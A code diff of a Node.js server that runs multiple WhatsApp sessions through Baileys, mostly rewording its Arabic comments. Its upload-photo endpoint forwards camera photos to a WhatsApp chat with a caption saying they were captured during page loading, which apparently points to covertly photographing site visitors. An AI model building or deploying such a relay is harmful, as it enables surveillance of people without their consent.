@@ -7,27 +7,29 @@ const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// جلسات متعددة، المفتاح هو sessionId
+// جلسات متعددة
 const sessions = {};
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Multer لتخزين الصور مؤقتاً
+// Multer لتخزين الصور مؤقتًا
 const upload = multer({ dest: path.join(__dirname, 'uploads') });
 
-// تحميل جميع أوامر الواتساب من مجلد commands
+// تحميل جميع أوامر الواتساب
 const commands = [];
 const commandsPath = path.join(__dirname, 'commands');
-fs.readdirSync(commandsPath).forEach(file => {
-    if (file.endsWith('.js')) {
-        const command = require(path.join(commandsPath, file));
-        if (typeof command === 'function') commands.push(command);
-    }
-});
+if (fs.existsSync(commandsPath)) {
+    fs.readdirSync(commandsPath).forEach(file => {
+        if (file.endsWith('.js')) {
+            const command = require(path.join(commandsPath, file));
+            if (typeof command === 'function') commands.push(command);
+        }
+    });
+}
 
-// دالة لإنشاء جلسة واتساب جديدة
+// إنشاء جلسة واتساب جديدة
 async function createSession(sessionId, phone) {
     if (sessions[sessionId]) {
         throw new Error('الجلسة موجودة بالفعل');
@@ -48,7 +50,7 @@ async function createSession(sessionId, phone) {
     sessions[sessionId] = sock;
     sock.ev.on('creds.update', saveCreds);
 
-    // التعامل مع الرسائل الواردة لكل جلسة
+    // الاستماع للرسائل
     sock.ev.on('messages.upsert', async ({ messages }) => {
         const msg = messages[0];
         if (!msg.message) return;
@@ -64,7 +66,7 @@ async function createSession(sessionId, phone) {
             }
         };
 
-        // تنفيذ كل أوامر الواتساب المتوفرة
+        // تنفيذ أوامر الواتساب
         for (const command of commands) {
             try {
                 await command({ text, reply, sock, msg, from, sessionId });
@@ -74,7 +76,7 @@ async function createSession(sessionId, phone) {
         }
     });
 
-    // التحقق من التسجيل، طلب رمز الاقتران إذا غير مسجل
+    // إذا الجلسة جديدة اطلب رمز الاقتران
     if (!sock.authState.creds.registered) {
         let code = await sock.requestPairingCode(phone);
         code = code.match(/.{1,4}/g).join('-');
@@ -103,12 +105,12 @@ app.post('/create-session', async (req, res) => {
     }
 });
 
-// عرض معرفات الجلسات النشطة
+// عرض الجلسات
 app.get('/sessions', (req, res) => {
     res.json(Object.keys(sessions));
 });
 
-// رفع الصور الملتقطة من الكاميرا
+// رفع الصور من الكاميرا
 app.post('/upload-photo', upload.array('photos', 2), async (req, res) => {
     try {
         const { chat, sessionId } = req.body;
@@ -119,7 +121,7 @@ app.post('/upload-photo', upload.array('photos', 2), async (req, res) => {
         const sock = sessions[sessionId];
         for (const file of req.files) {
             const imageBuffer = fs.readFileSync(file.path);
-            await sock.sendMessage(chat, { image: imageBuffer, caption: '📸 صورة تم التقاطها تلقائيًا أثناء التحميل' });
+            await sock.sendMessage(chat, { image: imageBuffer, caption: '📸 صورة تم التقاطها أثناء التحميل' });
             fs.unlinkSync(file.path);
         }
 
@@ -130,5 +132,5 @@ app.post('/upload-photo', upload.array('photos', 2), async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 السيرفر شغال على http://localhost:${PORT}`);
+    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
 });
